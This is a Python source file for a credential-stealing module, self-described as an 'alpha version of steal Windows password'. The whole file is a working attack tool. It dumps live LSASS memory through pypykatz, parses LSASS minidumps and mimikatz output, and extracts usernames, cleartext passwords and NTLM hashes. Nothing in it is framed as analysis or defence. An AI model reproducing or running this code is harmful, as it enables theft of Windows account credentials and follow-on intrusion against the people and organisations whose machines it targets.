from pypykatz.pypykatz import pypykatz
import re


class NTLM:
    """
        Alpha version of steal Windows password
    """
    def __init__(self):
        self.file_mimikatz = 'ntlm.txt'
        self.file_dump = 'lsassdump.dmp'

    @staticmethod
    def _extract_from_session(session):
        username_re = re.search(r'^username (.*)$', session, re.MULTILINE)
        username = username_re.group(1) if username_re else 'None'

        if not username:
            return {}

        ntlm_re = re.search(r'NT: ([a-f0-9]{32})', session, re.MULTILINE)
        ntlm = ntlm_re.group(1) if ntlm_re else 'None'

        password_re = re.findall(r'[pP]assword:? (.*)$', session, re.MULTILINE)
        password_all = list(set(password_re)) if password_re else ['None']
        password_ = list(filter(lambda x: x != 'None' and x != 'NA' and x, password_all))
        password = password_[0] if password_ else 'None'

        if password is 'None':
            return {}

        return {
            'User': username,
            'Password': password,
            'NTLM': ntlm,
        }

    def _extract_from_dump(self, mimi, method_name):
        data = []
        try:
            for luid in mimi.logon_sessions:
                session = str(mimi.logon_sessions[luid])
                session_data = self._extract_from_session(session)
                if session_data:
                    data.append(session_data)
        except:
            return {}

        return {f'NTLM by {method_name}': list(map(dict, set(tuple(x.items()) for x in data)))}

    def get_by_mimikatz(self):
        try:
            with open(self.file_mimikatz, 'r') as f:
                data = f.read().strip()

            try:
                p = re.compile(r'Username[\s:]+(.*)(?:\n\r?.*){2}NTLM[\s:]+([a-f0-9]{32})')
                name_and_ntlm = re.findall(p, data)
            except Exception as e:
                return {'NTLM by mimikatz': [{'Error to parse': str(e), 'Data': data}]}

            ntlm_parsed = {}
            name_and_ntlm = list(set(name_and_ntlm))
            ntlm_parsed['NTLM by mimikatz'] = [{'User': name, 'NTLM': ntlm} for name, ntlm in name_and_ntlm]
            return ntlm_parsed
        except:
            return {}

    def get_by_pypykatz(self):
        try:
            mimi = pypykatz.go_live()
        except:
            return {}

        return self._extract_from_dump(mimi, 'pypykatz')

    def get_by_procdump(self):
        try:
            mimi = pypykatz.parse_minidump_file(self.file_dump)
        except:
            return {}

        return self._extract_from_dump(mimi, 'procdump')

    def get_hash(self):
        hash_ = self.get_by_mimikatz()
        hash_.update(self.get_by_pypykatz())
        hash_.update(self.get_by_procdump())

        return hash_


if __name__ == '__main__':
    pass
